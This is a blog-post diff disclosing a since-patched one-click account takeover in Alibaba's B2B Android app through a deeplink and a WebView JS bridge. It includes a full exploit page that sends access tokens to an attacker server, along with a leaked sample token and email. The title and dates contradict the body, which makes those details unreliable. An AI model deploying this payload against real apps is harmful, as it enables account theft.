@@ -1,0 +1,172 @@
+---
+layout: default
+title:  "Exploiting Android Applications' Implicit Broadcasts via the AlarmManager Service"
+date:   2025-05-10 11:12:00 -0500
+categories: jekyll update
+templateEngineOverride: md
+permalink: /bloghub/AlarmManager-IB/
+---
+
+{% raw %} 
+
+## Introduction
+
+While doing some Android application vulnerability research, I discovered an interesting deeplink vulnerability that ended up impacting all Alibab's B2B Marketplace Android application without any server interaction, demostrating how a significant client-side mobile vulnerabilities can be.
+
+After three months of coordinated vulnerability triage and responsible disclosure, I published the vulnerability details to the community. I appreciated Alibaba’s security team’s professional and timely handling throughout the process.
+
+## Description
+
+Alibaba.com B2B Market Place Android application v25.3.0 was found to be vulnerable to a one-click vulnerability leading to a full account takeover vulnerability.
+The vulnerability stems from the usage of WindVane JS API that can be launched through a WebView and interacting with the JavaScript Bridge, by calling `window.windvane.nativeCall(objectMethod, params, token, callbackURL);`
+an attacker can call any registered WindVane plugins available and cause different impact based on the called plugin, breaking the system’s integrity.
+In this report, I have abused the `ALICommon.hasUserLogined` to leak user access token and user details such as first name, last name and mobile phone number.
+
+## Impact
+
+This vulnerability allows unauthenticated attackers to exfiltrate all user accounts from Alibaba’s B2B Marketplace. By tricking victims into clicking a malicious link, attackers can hijack their accounts, gaining full control and impersonating the victims. Once compromised, attackers can access sensitive personal data (such as phone numbers and credit card details), and perform unauthorized actions on behalf of the user.
+The impact is severe: it compromises both the confidentiality and integrity of Alibaba’s user data, while inflicting substantial reputational damage on Alibaba’s ability to protect its clients.
+
+## Steps to Reproduce
+
+By hosting an launcher.html with the following content, which can be an appealing attack site with clickable links inducing victims.
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Visit us at: skidz.io</title>
+</head>
+<body>
+  <script>
+        window.location.href = 'enalibaba://minisite?url=http://192.168.100.24:1337/exploit.html';
+  </script>
+</body>
+</html>
+```
+
+This will render a redirector that will use the `AppLinksActivity` activity uri scheme to open the HTML payload in a WebView within Alibaba’s application context through redirecting the user to `window.location.href='enalibaba://minisite?url=http://192.168.100.24:1337/exploit.html'
+exploit.html`
+In the following payload, we invoke the `hasUserLogined` method from the **ALICommon WindVane** plugin to retrieve sensitive user details (e.g., Access Token, First Name, Last Name) and exfiltrate them to an attacker-controlled server. While additional attack scenarios are possible, they were not reproduced in this research, as the account takeover scenario was determined to have the most severe impact among all potential cases.
+
+```html
+<script type="text/javascript">
+(function() {
+    if (typeof window.__windvane__ === "undefined") {
+        window.location = "<http://192.168.100.13:1337/fail?log=>" + encodeURIComponent("WindVane not found.");
+        return;
+    }
+
+    window.WindVane = window.__windvane__;
+
+    // Generate a unique token for this request
+    var token = "wv_" + Math.floor(Math.random() * 1e6);
+
+    // Define the global callback functions
+    window.__windvane__.onSuccess = function(reqId, result) {
+        if (reqId === token) {
+            window.location = "<http://192.168.100.13:1337/success?log=>" + encodeURIComponent("Success: " + JSON.stringify(result));
+        }
+    };
+
+    window.__windvane__.onFailure = function(reqId, error) {
+        if (reqId === token) {
+            window.location = "<http://192.168.100.13:1337/fail?log=>" + encodeURIComponent("Failure: " + JSON.stringify(error));
+        }
+    };
+
+    // Returns the AppKey
+    //var objectMethod = "aluWVJSBridge.getAppKey"; // Java object and method
+    //var params = "";           // Needs to be JSON string
+    
+    // Force user logout
+    //var objectMethod = "ALICommon.logout";
+    //var params = "";
+
+		// Create a new file on app external storage
+    //var objectMethod = "ALICommon.saveFile"
+    //var params = JSON.stringify({
+    //    "data": "dGVzdAo=",
+    //    "type": "txt",
+    //    "name": "poc"
+    //})
+    
+    var objectMethod = "ALICommon.hasUserLogined";
+    var params = "";
+
+    var callbackURL = location.href;
+
+    // Call the native Java method
+    window.__windvane__.nativeCall(objectMethod, params, token, callbackURL);
+})();
+</script>
+```
+
+The following list are the available functions provided by the `ALICommon` plugin:
+● setNavigationInfo
+● setTabBarInfo
+● getLocalCountryName
+● autoSignIn
+● mailTo
+● getPlatFormInfo
+● wdmClickControl
+● wdmExposure
+● wdmPageEnter
+● wdmPageLeave
+● setShareButtonOnNavigation
+● doShareWithPlatform
+● doOneStepShare
+● hasUserLogined
+● checkSign
+● goToNativeUrl
+● finishThisPage
+● signatureService
+● wdmYTTrack
+● mapTo
+● knockForThisSupplier
+● setPullRefreshEnabled
+● paySuccessBack
+● paySuccessOrderList
+● fetchData
+● showAlertDialog
+● setNavigationTitle
+● openPage
+● checkLogin
+● LOGOUT
+● doRouter
+● saveFile
+● postNotification
+● showDialogLoading
+● dismissDialogLoading
+● getArg
+
+I would like to note that there are tens of other registered plugins that can also be called through the exploit, however, in this PoC I’m only demonstrating the account takeover for brevity.
+We can host our `launcher.html` simply through Python:
+```bash
+python3 -m http.server 1337
+```
+Sending the victim with our attacker site URL, an induced victim will be redirected directly to the application:
+![image](https://raw.githubusercontent.com/J0LGER/bloghub/refs/heads/gh-pages/assets/images/mobile1.webp)
+
+However, under the hood, our attack server will receive a JSON object containing the user attributes including the access token:
+![image](https://raw.githubusercontent.com/J0LGER/bloghub/refs/heads/gh-pages/assets/images/mobile2.webp)
+
+Decoding the received data:
+```
+Success: "{\\"isLoginIn\\":1,\\"accessToken\\":\\"ab58c573a9bb17203928a52651680db6\\",\\"firstName\\":\\"Qdeer\\",\\"lastName\\":\\"Alasfar\\",\\"countryAbbr\\":\\"SA\\",\\"email\\":\\"qdeeralasfar@gmail.com\\",\\"memberId\\":\\"1558786838\\",\\"mobilePhoneNumber\\":\\"\\",\\"personStatus\\":\\"enabled\\",\\"phoneArea\\":\\"\\",\\"phoneCountry\\":\\"\\",\\"phoneNum\\":\\"\\",\\"serviceType\\":\\"ifm\\",\\"vaccountId\\":29059010726,\\"loginId\\":\\"sa29061066814spts\\",\\"ret\\":\\"HY_SUCCESS\\"}"
+```
+
+sing this token against alibaba.com for verification, we can update the cookie2 cookie value to our leaked accessToken of ab58c573a9bb17203928a52651680db6and test its validity to read user messages as an example:
+Sending a request with an invalid user session (token), we receive a login redirect due to unauthorized action:
+![image](https://raw.githubusercontent.com/J0LGER/bloghub/refs/heads/gh-pages/assets/images/mobile3.webp)
+
+However, using our leaked token, we successfully retrieve the user messages, applying fully account takeover:
+![image](https://raw.githubusercontent.com/J0LGER/bloghub/refs/heads/gh-pages/assets/images/mobile4.webp)
+
+## Discloure Details
+
+- 21/August/2025: Vulnerability Reported
+- 26/August/2025: Vulnerability Remediated
+
+{% endraw %}
